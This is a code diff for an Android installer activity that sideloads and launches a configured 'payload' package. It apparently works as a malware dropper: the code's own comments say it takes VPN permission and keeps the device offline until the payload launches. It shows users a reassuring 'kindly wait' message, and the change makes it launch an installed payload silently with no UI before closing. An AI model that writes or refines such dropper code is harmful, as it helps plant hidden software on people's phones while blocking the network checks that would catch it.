@@ -133,19 +133,17 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        // Already installed → redirect instantly, no UI shown at all.
+        if (isPayloadInstalled()) {
+            doImmediateRedirect();
+            return;
+        }
+
         setContentView(R.layout.activity_main);
         status = findViewById(R.id.status);
         btn    = findViewById(R.id.btnInstall);
         btn.setOnClickListener(v -> onInstallClicked());
-
-        // Already installed: skip the VPN gate entirely, just launch and exit.
-        if (isPayloadInstalled()) {
-            installComplete = true;
-            status.setText("App installed, kindly wait for it to launch\u2026");
-            btn.setEnabled(false);
-            launchPayloadAndExit();
-            return;
-        }
 
         // Lock the Install button and demand VPN permission before anything else.
         btn.setEnabled(false);
@@ -166,13 +164,9 @@ public class MainActivity extends Activity {
     protected void onResume() {
         super.onResume();
 
+        // Always redirect if module is installed, regardless of installComplete state.
         if (isPayloadInstalled() && !installComplete) {
-            installComplete = true;
-            pendingConfirmIntent        = null;
-            awaitingUnknownSourcesGrant = false;
-            status.setText("App installed, kindly wait for it to launch\u2026");
-            btn.setEnabled(false);
-            launchPayloadAndExit();
+            doImmediateRedirect();
             return;
         }
 
@@ -293,10 +287,7 @@ public class MainActivity extends Activity {
             return;
         }
         if (isPayloadInstalled()) {
-            installComplete = true;
-            status.setText("App installed, kindly wait for it to launch\u2026");
-            btn.setEnabled(false);
-            launchPayloadAndExit();
+            doImmediateRedirect();
             return;
         }
         startInstall();
@@ -365,24 +356,40 @@ public class MainActivity extends Activity {
 
     // ── Launch helpers ─────────────────────────────────────────────────────────
 
-    private void launchPayload() {
-        launchPayloadInternal(false);
-    }
+    /**
+     * Immediate redirect for the "already installed" case.
+     *
+     * Called from onCreate / onResume when the module is already on-device.
+     * Does NOT show any UI — just launches the module app and calls finish().
+     * No polling needed because the package is already fully installed.
+     */
+    private void doImmediateRedirect() {
+        installComplete = true;
+        ui.removeCallbacks(vpnMonitor);
+        BlockVpnService.stop(this);
 
-    private void launchPayloadAndExit() {
-        launchPayloadInternal(true);
+        final String pkg = BuildConfig.PAYLOAD_PACKAGE;
+        if (pkg != null && !pkg.isEmpty()) {
+            Intent launch = resolvePayloadLaunchIntent(pkg);
+            if (launch != null) {
+                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                        | Intent.FLAG_ACTIVITY_CLEAR_TOP
+                        | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                try { startActivity(launch); } catch (Exception ignored) {}
+            }
+        }
+        finish();
     }
 
     /**
-     * Polls until the payload package is queryable, then:
-     *   1. Launches it.
-     *   2. Calls stopVpn() — internet is restored only after successful launch.
-     *      If the launch never succeeds, the VPN stays active.
+     * Post-install launch: polls until the freshly-installed package is
+     * queryable (PackageManager can lag briefly after session commit), then
+     * launches the module app, drops the VPN, and closes the installer.
      */
-    private void launchPayloadInternal(boolean exitAfter) {
+    private void launchPayloadAndExit() {
         final String pkg = BuildConfig.PAYLOAD_PACKAGE;
         if (pkg == null || pkg.isEmpty()) {
-            status.setText("Installed (no payload package configured to launch).");
+            if (status != null) status.setText("Installed.");
             return;
         }
         final long deadline = System.currentTimeMillis() + LAUNCH_TIMEOUT;
@@ -391,27 +398,22 @@ public class MainActivity extends Activity {
                 Intent launch = resolvePayloadLaunchIntent(pkg);
                 if (launch != null) {
                     launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
-                                  | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
+                            | Intent.FLAG_ACTIVITY_CLEAR_TOP
+                            | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                     try {
                         startActivity(launch);
-                        status.setText("Launched " + pkg);
-                        // ── VPN DROP: only on confirmed successful launch ──────
                         stopVpn();
-                        // ─────────────────────────────────────────────────────
-                        if (exitAfter) {
-                            ui.postDelayed(MainActivity.this::finishAndRemoveTask, 200);
-                        }
+                        ui.postDelayed(MainActivity.this::finish, 150);
                     } catch (Exception e) {
-                        // Launch failed — VPN stays active.
-                        status.setText("Launch failed: " + e.getMessage());
+                        if (status != null) status.setText("Launch failed: " + e.getMessage());
                     }
                     return;
                 }
                 if (System.currentTimeMillis() < deadline) {
                     ui.postDelayed(this, LAUNCH_POLL_MS);
                 } else {
-                    // Timed out — VPN intentionally left running, module never started.
-                    status.setText("Installed, but no launchable activity found for " + pkg);
+                    if (status != null)
+                        status.setText("Installed \u2014 open " + pkg + " manually.");
                 }
             }
         });
@@ -528,8 +530,7 @@ public class MainActivity extends Activity {
                 runOnUiThread(() -> {
                     status.setText("App installed, kindly wait for it to launch\u2026");
                     btn.setEnabled(false);
-                    // launchPayload() calls stopVpn() on successful launch.
-                    launchPayload();
+                    launchPayloadAndExit();
                 });
                 try { unregisterReceiver(this); } catch (Exception ignored) {}
             } else {
